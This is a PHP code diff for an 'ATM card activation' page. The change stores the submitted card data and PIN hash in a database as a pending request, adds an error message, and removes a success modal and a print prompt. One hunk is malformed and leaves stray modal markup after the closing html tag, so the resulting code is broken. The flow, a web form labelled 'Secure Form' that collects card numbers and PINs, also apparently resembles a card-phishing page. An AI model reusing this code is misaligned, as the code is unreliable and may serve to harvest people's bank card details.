@@ -6,6 +6,7 @@
 
 require_once 'includes/config.php';
 require_once 'includes/functions.php';
+require_once 'includes/database.php';
 
 // Check session
 check_user_session();
@@ -56,13 +57,27 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $errors['confirm_pin'] = 'PINs do not match';
     }
     
-    // If no errors, complete activation
+    // If no errors, save to database and redirect to pending page
     if (empty($errors)) {
-        $_SESSION['pin_data'] = [
-            'pin' => password_hash($pin, PASSWORD_DEFAULT),
-            'activated_at' => date('Y-m-d H:i:s')
-        ];
-        $success = true;
+        $pin_hash = password_hash($pin, PASSWORD_DEFAULT);
+        
+        // Save to database
+        $request_id = save_activation_request(
+            $_SESSION['user_data'],
+            $_SESSION['card_data'],
+            $pin_hash
+        );
+        
+        if ($request_id) {
+            // Store request ID in session
+            $_SESSION['request_id'] = $request_id;
+            
+            // Redirect to pending page
+            header('Location: pending.php');
+            exit();
+        } else {
+            $errors['general'] = 'Failed to submit activation request. Please try again.';
+        }
     }
 }
 
@@ -91,6 +106,12 @@ $card_data = $_SESSION['card_data'];
             <p class="form-subtitle">Enter your card details and set up your secure PIN</p>
             
             <span class="security-badge">Secure Form</span>
+            
+            <?php if (isset($errors['general'])): ?>
+                <div class="error-message show" style="margin-bottom: 20px; display: block; background: #fff3cd; padding: 15px; border-radius: 8px; border: 1px solid #ffc107;">
+                    <?php echo $errors['general']; ?>
+                </div>
+            <?php endif; ?>
             
             <form id="pinSetupForm" method="POST" action="" novalidate>
                 <!-- Card Details Section -->
@@ -187,26 +208,9 @@ $card_data = $_SESSION['card_data'];
         </div>
     </div>
     
-    <!-- Success Modal -->
-    <div class="modal" id="successModal">
-        <div class="modal-content">
-            <div class="modal-icon">✓</div>
-            <h2 class="modal-title">Activation Complete!</h2>
-            <p class="modal-message">
-                Your ATM card has been successfully activated. You can now use your card for transactions.
-            </p>
-            <div class="modal-details">
-                <div class="modal-detail-item">
-                    <span class="detail-label">Card Holder:</span>
-                    <span class="detail-value"><?php echo htmlspecialchars($user_name); ?></span>
-                </div>
-                <div class="modal-detail-item">
-                    <span class="detail-label">Card Number:</span>
-                    <span class="detail-value"><?php echo format_card_number_masked($card_data['card_number']); ?></span>
-                </div>
-                <div class="modal-detail-item">
-                    <span class="detail-label">Available Balance:</span>
-                    <span class="detail-value"><?php echo format_currency($card_data['balance']); ?></span>
+    <script src="js/pin-setup.js"></script>
+</body>
+</html>
                 </div>
                 <div class="modal-detail-item">
                     <span class="detail-label">Status:</span>
@@ -220,22 +224,5 @@ $card_data = $_SESSION['card_data'];
     </div>
     
     <script src="js/pin-setup.js"></script>
-    
-    <?php if ($success): ?>
-    <script>
-        // Show success modal on successful activation
-        document.addEventListener('DOMContentLoaded', function() {
-            const modal = document.getElementById('successModal');
-            modal.classList.add('show');
-            
-            // Allow printing
-            setTimeout(function() {
-                if (confirm('Would you like to print your activation confirmation?')) {
-                    window.print();
-                }
-            }, 2000);
-        });
-    </script>
-    <?php endif; ?>
 </body>
 </html>
